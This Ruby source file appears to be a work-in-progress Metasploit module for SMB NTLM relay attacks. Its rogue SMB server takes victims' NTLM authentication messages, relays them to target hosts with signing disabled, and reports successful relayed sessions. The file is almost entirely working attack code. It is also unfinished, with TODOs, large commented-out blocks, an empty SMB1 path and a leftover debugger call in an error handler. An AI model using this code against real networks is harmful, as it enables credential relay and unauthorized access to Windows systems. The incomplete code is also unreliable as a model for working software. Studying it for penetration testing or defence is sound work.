module Msf::Exploit::Remote::SMB::Mitm

  # This class represents a single connected client to the server. It stores and processes connection specific related
  # information.
  # Has overridden methods than allow smb relay attacks.
  class MITMServerClient < ::RubySMB::Server::ServerClient
    #TODO Update to work with multiple targets
    @relay_mode = false

    #
    # Handle an authenticated request. This is the main handler for all requests after the connection has been
    # authenticated.
    #
    # @param [String] raw_request the request that should be handled
    def do_tree_connect_smb2(request, session)
      if @relay_mode
        return super
      end

      @relay_mode = true

      response = RubySMB::SMB2::Packet::TreeConnectResponse.new
      response.smb2_header.nt_status = ::WindowsError::NTStatus::STATUS_NETWORK_SESSION_EXPIRED.value
      # response.smb2_header.message_id = request.smb2_header.message_id
      # response.smb2_header.session_id = session.session_id

      # Credits
      response.smb2_header.credit_charge = 0
      response.smb2_header.credits = 1

      # Share Type
      response.share_type = 0

      # Maximal Access
      response.maximal_access[:read_data] = 1
      response.maximal_access[:write_data] = 1
      response.maximal_access[:append_data] = 1
      response.maximal_access[:read_ea] = 1
      response.maximal_access[:write_ea] = 1
      response.maximal_access[:execute] = 1
      response.maximal_access[:delete_child] = 1
      response.maximal_access[:read_attr] = 1
      response.maximal_access[:write_attr] = 1
      response.maximal_access[:delete_access] = 1
      response.maximal_access[:read_control] = 1
      response.maximal_access[:write_dac] = 1
      response.maximal_access[:write_owner] = 1

      response
    end

    def do_session_setup_smb2(request, session)
      # if !@relay_mode
      #   response = super
      #   return response
      # end

      session_id = request.smb2_header.session_id
      if session_id == 0
        session_id = rand(1..0xfffffffe)
        session = @session_table[session_id] = ::RubySMB::Server::Session.new(session_id)
      else
        session = @session_table[session_id]
        if session.nil?
          response = SMB2::Packet::ErrorPacket.new
          response.smb2_header.nt_status = WindowsError::NTStatus::STATUS_USER_SESSION_DELETED
          return response
        end
      end

      result = process_gss(request.buffer)
      return if result.nil?

      response = ::RubySMB::SMB2::Packet::SessionSetupResponse.new
      response.smb2_header.credits = 1
      response.smb2_header.message_id = request.smb2_header.message_id
      response.smb2_header.session_id = session_id

      if result.is_a?(::Net::NTLM::Message)
        response.smb2_header.nt_status = ::WindowsError::NTStatus::STATUS_MORE_PROCESSING_REQUIRED.value
        response.buffer = result.serialize

        if @dialect == '0x0311'
          update_preauth_hash(response)
        end

        return response
      else
        response.smb2_header.nt_status = result.nt_status.value
        response.buffer = result.buffer
      end

      update_preauth_hash(request) if @dialect == '0x0311'
      if result.nt_status == WindowsError::NTStatus::STATUS_SUCCESS
        response.smb2_header.credits = 32
        session.state = :valid
        session.user_id = result.identity
        session.key = @gss_authenticator.session_key
        session.signing_required = request.security_mode.signing_required == 1
      elsif result.nt_status == WindowsError::NTStatus::STATUS_MORE_PROCESSING_REQUIRED && @dialect == '0x0311'
        update_preauth_hash(response)
      end

      response
    end
  end

  class Target
    def initialize(ip, port, protocol)
      @ip = ip
      @port = port
      @protocol = protocol
    end

    attr_reader :ip, :port, :protocol
  end

  # A thread safe target list. The provided targets will be iterated over via the {next} method.
  class TargetList
    include MonitorMixin

    # @param [Array<String>] targets
    def initialize(targets)
      super()
      @walker = Rex::Socket::RangeWalker.new(targets)
    end

    # Return the next available target, or nil
    def next
      synchronize do
        # TODO: Confirm HTTP relay semantics
        Target.new(@walker.next_ip, 445, :smb)
      end
    end
  end

  class MITMClient < ::RubySMB::Client
    attr_reader :target

    def initialize(dispatcher, smb1: true, smb2: true, smb3: true, username:, password:, domain: nil, local_workstation: nil, always_encrypt: nil, ntlm_flags: nil, provider: nil, target: nil)
      super(dispatcher,
            smb1: smb1,
            smb2: smb2,
            smb3: smb3,
            username: username,
            password: password,
            domain: domain,
            local_workstation: local_workstation,
            always_encrypt: always_encrypt,
            ntlm_flags: ntlm_flags)

      @provider = provider
      @target = target
    end

    def get_peer_server_challenge(client_type1_msg)
      @version = negotiate

      if @version == 'SMB1'
        # neg_pkt = smb1_ntlmssp_negotiate_packet
        # neg_pkt.set_ntlm_type1_blob(victim_type1_msg.serialize)
        # resp = send_recv(neg_pkt)
        #
        # challenge_packet = smb1_ntlmssp_challenge_packet(resp)
        #
        # # Store the available OS information before going forward.
        # @peer_native_os = challenge_packet.data_block.native_os.to_s
        # @peer_native_lm = challenge_packet.data_block.native_lan_man.to_s
        #
        # @user_id = challenge_packet.smb_header.uid
        #
        # type2_message_encoded = smb1_type2_message(challenge_packet)
        #
        # type2_challenge = Net::NTLM::Message.decode64(type2_message_encoded)
        #
        # type2_challenge.challenge
      else
        # Same as the ::RubySMB::Client::Authentication smb2_authenticate method, with two differences
        #  - changes the type1_blob to match the blob of the type1 messages received from the client
        #  - returns the challenge messages received from the server

        server_type1_pkt = smb2_ntlmssp_negotiate_packet

        server_type1_pkt.set_ntlm_type1_blob(client_type1_msg)
        server_type1_pkt.security_mode.signing_enabled = 0
        server_type2_pkt_raw = send_recv(server_type1_pkt)
        server_type2_pkt = smb2_ntlmssp_challenge_packet(server_type2_pkt_raw)

        if @dialect == '0x0311'
          update_preauth_hash(server_type2_pkt)
        end

        @session_id = server_type2_pkt.smb2_header.session_id
        type2_ntlm_message = smb2_type2_message(server_type2_pkt)

        Net::NTLM::Message.decode64(type2_ntlm_message)

        # TODO Below commented out code needs moved into auth_attempt
        # Additionally, we need to have the type3 message created using the @ntlm_client.session object
        #   this may require rummaging around in the guts of @ntlm_client and it's session to figure out how
        #   to do that
        #
        # @server_type3_message = @ntlm_client.init_context(type2_ntlm_message)
        #
        # @session_key = @ntlm_client.session_key
        # server_type2_message = @ntlm_client.session.challenge_message
        # store_target_info(server_type2_message.target_info) if server_type2_message.has_flag?(:TARGET_INFO)
        # @os_version = extract_os_version(server_type2_message.os_version.to_s) unless server_type2_message.os_version.empty?
      end
    rescue ::Exception => e
      msg = "Unable to retrieve server challenge at #{peer_host}:#{peer_port} on local interface #{local_host}."
      elog(msg, error: e)
      print_warning msg
    end

    def send_auth_attempt(victim_type3_message)
      if @version == 'SMB1'
        # neg_pkt = smb1_ntlmssp_negotiate_packet
        # neg_pkt.set_ntlm_type1_blob(victim_type1_msg.serialize)
        # resp = send_recv(neg_pkt)
        #
        # challenge_packet = smb1_ntlmssp_challenge_packet(resp)
        #
        # # Store the available OS information before going forward.
        # @peer_native_os = challenge_packet.data_block.native_os.to_s
        # @peer_native_lm = challenge_packet.data_block.native_lan_man.to_s
        #
        # @user_id = challenge_packet.smb_header.uid
        #
        # type2_message_encoded = smb1_type2_message(challenge_packet)
        #
        # type2_challenge = Net::NTLM::Message.decode64(type2_message_encoded)
        #
        # type2_challenge.challenge
      else
        # Same as the ::RubySMB::Client::Authentication smb2_authenticate method, with two differences
        #  - changes the type1_blob to match the blob of the type1 messages received from the client
        #  - returns the challenge messages received from the server

        # server_type1_pkt = smb2_ntlmssp_negotiate_packet
        # server_type1_pkt.set_ntlm_type1_blob(victim_type1_msg.serialize)
        # server_type2_pkt_raw = send_recv(server_type1_pkt)
        #
        # if @dialect == '0x0311'
        #   update_preauth_hash(server_type2_pkt_raw)
        # end
        #
        # server_type2_pkt = smb2_ntlmssp_challenge_packet(server_type2_pkt_raw)
        # @session_id = server_type2_pkt.smb2_header.session_id
        #
        # type2_ntlm_message = smb2_type2_message(server_type2_pkt)
        #
        # @type3_msg = @ntlm_client.init_context(type2_ntlm_message)
        # @ntlm_client.session.challenge_message.challenge


        # force_encoding needed to avoid an +Encoding::CompatibilityError+ when serializing the type3 message.
        # serialize happens in the rubyntlm library
        # TODO overwrite type3 class to have a serialize method that supports different encodings of strings
        # type3_opts = {
        #   :lm_response   => victim_type3_message.lm_response.force_encoding("ASCII-8BIT"),
        #   :ntlm_response => victim_type3_message.ntlm_response.force_encoding("ASCII-8BIT"),
        #   :domain        => victim_type3_message.domain.force_encoding("ASCII-8BIT"),
        #   :user          => victim_type3_message.user.force_encoding("ASCII-8BIT"),
        #   :workstation   => victim_type3_message.workstation.force_encoding("ASCII-8BIT"),
        #   :flag          => @server_type3_message.flag,
        #   :session_key   => @server_type3_message.session_key # Can be empty, but in that case it's just setting the default value explicitly
        # }
        # combined_type3_message = ::Net::NTLM::Message::Type3.create type3_opts

        # Set AUTHENTICATE_MESSAGE.MIC to Z(16)
        #  If (NTLMSSP_NEGOTIATE_KEY_EXCH flag is set in NegFlg
        #    AND (NTLMSSP_NEGOTIATE_SIGN OR NTLMSSP_NEGOTIATE_SEAL are set in NegFlg) )
        #      Set ExportedSessionKey to RC4K(KeyExchangeKey,
        #       AUTHENTICATE_MESSAGE.EncryptedRandomSessionKey)
        #  Else
        #      Set ExportedSessionKey to KeyExchangeKey
        #  EndIf
        #  Set MIC to HMAC_MD5(ExportedSessionKey, ConcatenationOf(
        #          NEGOTIATE_MESSAGE, CHALLENGE_MESSAGE,
        #          AUTHENTICATE_MESSAGE))
        #
        #  Set ClientSigningKey to SIGNKEY(NegFlg, ExportedSessionKey , "Client")
        #  Set ServerSigningKey to SIGNKEY(NegFlg, ExportedSessionKey , "Server")
        #  Set ClientSealingKey to SEALKEY(NegFlg, ExportedSessionKey , "Client")
        #  Set ServerSealingKey to SEALKEY(NegFlg, ExportedSessionKey , "Server")
        #  RC4Init(ClientHandle, ClientSealingKey)
        #  RC4Init(ServerHandle, ServerSealingKey)

        # @server_type3_message.domain = victim_type3_message.dup.domain.force_encoding("ASCII-8BIT")
        # @server_type3_message.user = victim_type3_message.dup.user.force_encoding("ASCII-8BIT")
        # @server_type3_message.workstation = victim_type3_message.dup.force_encoding("ASCII-8BIT")

        packet = RubySMB::SMB2::Packet::SessionSetupRequest.new

        packet.smb2_header.session_id = @session_id
        packet.smb2_header.credits = 127

        packet.security_mode.signing_enabled = 0
        # packet.capabilities.dfs = 1

        packet.set_type3_blob(victim_type3_message)

        response = send_recv(packet)
        if @dialect == '0x0311'
          update_preauth_hash(packet)
        end

        # raw = smb2_ntlmssp_authenticate(victim_type3_message, @session_id)
        response = smb2_ntlmssp_final_packet(response)

        if @smb3 && !@session_encrypt_data && response.session_flags.encrypt_data == 1
          @session_encrypt_data = true
        end

        response
      end
    rescue ::Exception => e
      msg = "Unable to retrieve server challenge at #{peer_host}:#{peer_port} on local interface #{local_host}."
      elog(msg, error: e)
      print_warning msg
    end

    def normalize_type3_encoding(type3_msg)
      type3_msg.security_buffers.map!{ |_buffer_name, security_buffer| security_buffer.value.force_encoding("ASCII-8BIT") }
    end

    # def create_pipe(path, disposition=RubySMB::Dispositions::FILE_OPEN_IF)
    #   require 'pry'
    #   binding.pry
    #
    #   fid = open(path, disposition, write: true, read: true, pipe: true)
    #   @open_files[fid]
    # end

    alias :connect :tree_connect
  end

  class RubySMBMITMAuthenticator < ::Msf::Exploit::SMBHashCapture::HashCaptureAuthenticator
    def initialize(provider, server_client, relay_targets)
      super(provider, server_client)
      @relay_targets = relay_targets
    end

    def reset!
      super

      # Server that we are passing the hash to
      @server_connection = nil
    end

    # TODO: Should this get the session?
    def process(request_buffer = nil)
      gss_result = super(request_buffer)
      return gss_result if gss_result

      # TODO: Add support for a default NTLM provider in ruby_smb
      if gss_result.nil?
        begin
          ntlm_message = Net::NTLM::Message.parse(request_buffer)
        rescue ArgumentError
          return
        end
      end

      if ntlm_message.instance_of?(::Net::NTLM::Message::Type1)
        result = relay_ntlm_type1(request_buffer.to_s)
      elsif ntlm_message.instance_of?(::Net::NTLM::Message::Type3)
        result = relay_ntlm_type3(request_buffer.to_s)
      end

      result
    end

    #
    # Process the NTLM type 1 message and build a type 2 response message.
    #
    # @param [Net::NTLM::Message::Type1] type1_msg the NTLM type 1 message received by the client that should be
    #   processed
    # @return [RubySMB::Gss::Provider::Result] the NTLM type 2 response message with which to reply to the client
    # wrapped in a +RubySMB::Gss::Provider::Result+ class
    def relay_ntlm_type1(type1_msg)
      @relay_target = @relay_targets.next

      if @relay_target.nil? || @relay_target.ip.nil?
        puts "finished"
        # TODO
        # raise StandardError, "no more targets"
      end

      @relayed_connection = create_mitm_client(@relay_target,
                                               @provider.local_host, @provider.timeout)

      server_type2_msg = @relayed_connection.get_peer_server_challenge(type1_msg)

      # Needed for capturing future hashes
      # client_type2_msg = process_ntlm_type1(type1_msg)

      # Overwriting the Authenticator server_challenge to ensure future hash generation is performed correctly
      # @server_challenge = [server_type2_msg.challenge].pack('Q<')
      # client_type2_msg.challenge = server_type2_msg.challenge
      # client_type2_msg.flag = server_type2_msg.flag
      # client_type2_msg.target_info = server_type2_msg.target_info
      # client_type2_msg.target_name = server_type2_msg.target_name
      # client_type2_msg.os_version = server_type2_msg.os_version

      server_type2_msg
    end

    #
    # Process the NTLM type 3 message and either accept or reject the authentication attempt.
    #
    # @param [Net::NTLM::Message::Type3] type3_msg the NTLM type 3 message received by the client that should be
    #   processed
    # @return [WindowsError::ErrorCode] an NT Status error code representing the operations outcome where
    #   STATUS_SUCCESS is a successful authentication attempt and anything else is a failure
    def relay_ntlm_type3(victim_type3_msg)
      # captures hash using +HashCaptureAuthenticator+ process_ntlm_type3 method
      # super(victim_type3_msg)

      resp = @relayed_connection.send_auth_attempt(victim_type3_msg)

      if resp.smb2_header.nt_status == WindowsError::NTStatus::STATUS_SUCCESS
        @provider.listener.on_relay_success(@relayed_connection)
      else
        @provider.listener.on_relay_failure(@relayed_connection)
        @relayed_connection.logoff!
      end

      RubySMB::Gss::Provider::Result.new(nil, resp.smb2_header.nt_status)
    end

    def process_ntlm_type3(type3_msg)
      super

      ::WindowsError::NTStatus::STATUS_SUCCESS
    end

    def create_mitm_client(target, local_host, timeout)
      sock = Rex::Socket::Tcp.create(
        'LocalHost' => local_host,
        'PeerHost' => target.ip,
        'PeerPort' => target.port,
        'Server' => false,
        'Timeout' => timeout,
        'Context' =>
          {
            'Caller' => self
          }
      )

      dispatcher = RubySMB::Dispatcher::Socket.new(sock)
      client = MITMClient.new(dispatcher, provider: self, username: '', password: '',
                              smb1: false, smb2: true, smb3: true, target: target)

      client
    rescue ::Exception => e
      require 'pry'; binding.pry
      msg = "Unable to create connection to server #{peer_host}:#{peer_port} on local interface #{local_host}."
      elog(msg, error: e)
      print_warning msg
    end
  end


  #
  # A GSS provider that authenticates clients via the passing of a hash to a specified remote host.
  #
  class RubySMBMITMProvider < ::Msf::Exploit::SMBHashCapture::HashCaptureNTLMProvider
    include RubySMB::NTLM
    include ::Msf::Exploit::SMBHashCapture

    def initialize(opts)
      raise ArgumentError, 'Must specify relay targets' unless opts[:relay_targets]
      raise ArgumentError, 'Must specify a local_host' unless opts[:local_host]
      super(allow_anonymous: opts[:allow_anonymous], default_domain: opts[:default_domain], listener: opts[:listener])

      @relay_targets = opts[:relay_targets]
      @local_host = opts[:local_host]
      @timeout = opts[:timeout] ? opts[:timeout] : 3
      @listener = opts[:listener]
    end

    def new_authenticator(server_client)
      # build and return an instance that can process and track stateful information for a particular connection but
      # that's backed by this particular provider
      RubySMBMITMAuthenticator.new(self, server_client, TargetList.new(relay_targets))
    end

    attr_reader :relay_targets, :local_host, :timeout, :listener
  end
end
